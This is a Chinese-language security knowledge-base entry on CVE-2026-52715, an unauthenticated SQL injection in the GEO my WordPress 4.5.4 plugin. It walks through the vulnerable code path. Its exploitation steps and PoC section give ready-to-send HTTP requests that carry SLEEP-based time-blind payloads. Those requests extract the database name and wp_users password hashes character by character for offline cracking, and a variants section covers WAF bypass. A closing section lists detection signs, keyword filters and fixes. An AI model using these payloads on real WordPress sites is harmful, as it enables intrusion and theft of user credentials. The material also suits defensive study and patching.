---
id: web-generic-sqli-geo-my-wordpress-boundary-time-blind
title: GEO my WordPress 4.5.4 未授权 SQL 注入：经纬度参数直接拼进 BETWEEN 的时间盲注
type: scenario
domain: web
path: web/generic/sqli
technique: geo-my-wordpress-boundary-sqli
aliases:
- CVE-2026-52715
- GEO my WP SQL 注入
- gmw_get_locations_within_boundaries_sql
- swlatlng 注入
- nelatlng 注入
- 经纬度 SQL 注入
- WordPress 地理位置插件 SQLi
tags:
- wordpress
- sqli
- time-based-blind
- php
- mysql
- cve-2026-52715
- plugin
- unauthenticated
cve:
- CVE-2026-52715
severity: high
confidence: high
affected_versions: GEO my WordPress 4.5.4（修复版本 4.5.5.1）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V30
  verified_at: '2026-11-05T03:18:58+08:00'
  notes: 已对照原文核对六层数据流/注入点sw[0]/SLEEP按行延迟/CVE与版本；原文实测0.038s→9.04s，PoC未在本会话执行
---

## 一句话结论

GEO my WordPress 4.5.4 的 `gmw_get_locations_within_boundaries_sql()` 只对 `swlatlng`/`nelatlng` 做 `explode(',')` 拆分，随后把四个片段直接插进 `BETWEEN` SQL 字符串，没有 `$wpdb->prepare()`、`esc_sql()` 或 `intval()`；未认证访客在带 `[gmw]` 短代码的页面传入 `form`、`action=fs` 和恶意 `swlatlng`，即可用 `sw[0]` 的 `#` 注释做时间盲注，逐字符读取 `wp_users.user_pass` 等数据库内容。

## 原理

- **六层数据流**：`GMW_Form::get_form_values()` 读取 `$_SERVER['QUERY_STRING']` → `gmw_get_form_values()` 用 `parse_str()` 解析全部参数（无白名单）→ `GMW_Form_Core::parse_query_args()` 把 `swlatlng`/`nelatlng` 映射为 `gmw_swlatlng`/`gmw_nelatlng` → `class-gmw-wp-query.php` 在两者非空时执行 `$where .= gmw_get_locations_within_boundaries_sql(...)` → 漏洞函数拼接 SQL。
- **“看起来是数字”不等于安全**：函数对 `$southwest`/`$northeast` 只做 `explode(',', ...)`，随后直接使用 `$sw[0]`、`$sw[1]`、`$ne[0]`、`$ne[1]`。`explode` 只分割字符串，不做类型转换、范围校验或转义，四个值都可以携带 SQL 语法。
- **注入点选择**：`$sw[1]` 同时出现在 `AND (( ...`（两层括号）和 `OR (...`（一层括号）两个从句，单一 payload 难以同时闭合；`$sw[0]` 位于第一个 `BETWEEN {$sw[0]} AND {$ne[0]}`，只需一个 `#` 行注释就能截断后续所有 SQL，是更稳定的注入点。
- **时间盲注成立的原因**：MySQL 的 `SLEEP(N)` 在子查询求值时按行执行；`BETWEEN 1 AND (SELECT CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END)` 中，条件为真时每行延迟 3 秒，子查询返回 0 后 `BETWEEN 1 AND 0` 为假但不影响语句合法性。总延迟约等于 `SLEEP 秒数 × 匹配行数`（原文环境 3 行 × 3 秒 = 9 秒）。
- **认证绕过**：短代码处理器检测到 GET 的 `form`/`action=fs` 后进入表单提交流程，最终到达查询函数；整个路径不需要登录，只要插件激活且页面包含 `[gmw search_results="1"]`。
- **修复**：4.5.5.1 用 `$wpdb->prepare()` 配合 `%f` 占位符，并在拼接前用 `gmw_parse_latlng_boundary()` 校验输入，把数据与 SQL 语法分离。

## 触发条件

- 目标安装并启用 GEO my WordPress 4.5.4（受影响版本明确；修复 4.5.5.1）。
- 站点存在包含 `[gmw]` / `[gmw search_results="1"]` 短代码的页面，且该页面可匿名访问。
- 数据库为 MySQL（`SLEEP`/`SUBSTRING`/`CASE` 可用）；表中有至少一行地理位置数据，延迟才明显。
- 攻击者能访问 WordPress 前端并控制 `swlatlng`/`nelatlng` 查询参数；`form` 值对应有效表单 id，`action=fs` 触发表单流程。
- 无需任何 WordPress 账号或认证。

## 利用步骤

1. 确认插件与页面：访问带 `[gmw]` 短代码的页面，观察位置搜索功能；或检查 `wp-content/plugins/geo-my-wp/` 与插件版本。
2. 建立基线：请求 `?page_id=<id>&form=<form_id>&action=fs&swlatlng=1,1&nelatlng=1,1`，记录响应时间（原文约 0.038s）。
3. 验证注入：把 `swlatlng` 改为 `1 AND (SELECT CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END)#,1`，若响应约 9 秒（3 行 × 3 秒），确认时间盲注。
4. 逐字符提取：用 `SUBSTRING(DATABASE() FROM <pos> FOR 1)=CHAR(<ascii>)` 或 `ASCII(SUBSTRING(...))` 做二分/线性判断，按响应时间区分真假。
5. 提取 `wp_users.user_pass`：把子查询换成 `(SELECT user_pass FROM wp_users LIMIT 1 OFFSET 0)`，用 Burp Intruder/Pitchfork 串行跑位置与 ASCII 值（时间盲注不能并发）。
6. 用拿到的哈希离线爆破，或继续读取 `wp_options`、`wp_usermeta` 等表。

## PoC

基线请求：

```http
GET /?page_id=4&form=1&action=fs&swlatlng=1,1&nelatlng=1,1 HTTP/1.1
Host: target
```

时间盲注验证：

```http
GET /?page_id=4&form=1&action=fs&swlatlng=1 AND (SELECT CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END)#,1&nelatlng=1,1 HTTP/1.1
Host: target
```

生成的 SQL 片段：

```sql
AND ( gmw_locations.latitude BETWEEN 1 AND (SELECT CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END)# AND 1 ) ...
```

逐字符提取：

```http
GET /?page_id=4&form=1&action=fs&swlatlng=1 AND (SELECT CASE WHEN SUBSTRING(DATABASE() FROM 1 FOR 1)=CHAR(119) THEN SLEEP(2) ELSE 0 END)#,1&nelatlng=1,1 HTTP/1.1
Host: target
```

提取用户哈希（Burp Intruder 占位）：

```http
GET /?page_id=4&form=1&action=fs&swlatlng=1 AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1 OFFSET 0) FROM §pos§ FOR 1))<=§ascii§ THEN SLEEP(1) ELSE 0 END)#,1&nelatlng=1,1 HTTP/1.1
Host: target
```

说明：原文实测基线 0.038s、SLEEP(3) 注入 9.04s，并给出逐字符提取 DATABASE() 与 wp_users 哈希的请求；以上 payload 未在本会话执行。

## 变体与关联

- 变体（注入参数）：`nelatlng` 的 `$ne[0]`/`$ne[1]` 同样未过滤，可替换 `swlatlng` 或组合使用；`sw[1]`/`ne[1]` 因括号嵌套不同，需要调整注释与闭合方式。
- 变体（注入类型）：`SLEEP` 被 WAF 拦截时可换 `BENCHMARK()`、报错注入（若回显）、布尔盲注（依赖页面差异）；时间盲注也可用 `IF()` 替代 `CASE WHEN`。
- 变体（参数入口）：插件通过 `parse_str()` 解析整个 `QUERY_STRING`，其他表单字段也可能进入同一查询参数；审计时应检查 `gmw_swlatlng`/`gmw_nelatlng` 的所有来源。
- 关联：[[web-generic-sqli-wordpress-plugin-order-by-time-blind]]（同为 WordPress 插件未授权时间盲注，注入点为 ORDER BY 子查询）；[[web-generic-sqli-like-clause-append-search]]（字符串拼接进 LIKE，根因同为未参数化）。
- 边界：插件未激活、页面无 `[gmw]` 短代码、目标非 MySQL、或已升级到 4.5.5.1 时，本链不成立；表中无数据时 `SLEEP` 延迟可能不明显。

## 检测与防御

- 检测：查询字符串出现 `SLEEP`、`BENCHMARK`、`CASE WHEN`、`SUBSTRING`、`CHAR(`、`#` 等组合，尤其是 `swlatlng`/`nelatlng` 参数；同一页面基线响应与含上述关键词的响应时间差异显著。
- 检测：短时间大量串行请求同一页面、参数按位递增（Burp Intruder 式盲注）；WordPress 访问日志中出现编码后的 `%23`、`%20AND%20`、`SELECT` 等。
- 检测：插件版本低于 4.5.5.1；`gmw_get_locations_within_boundaries_sql()` 中未出现 `$wpdb->prepare`（原文提供 grep 检查）。
- 防御：升级到 GEO my WordPress ≥ 4.5.5.1；对所有经纬度参数用 `%f` 参数化，并在拼接前做浮点/范围校验，禁止 `explode` 后直接使用。
- 防御：不要把 `$_SERVER['QUERY_STRING']` 整体 `parse_str` 后无白名单地传入查询；只接受明确的参数名与类型。
- 临时缓解：WAF/网关拦截含 `SLEEP`、`BENCHMARK`、`UNION`、`SELECT`、`CASE WHEN` 的查询串（原文明确可被绕过，仅作补充）；限制数据库账号权限，避免使用高权限账号连接 WordPress。
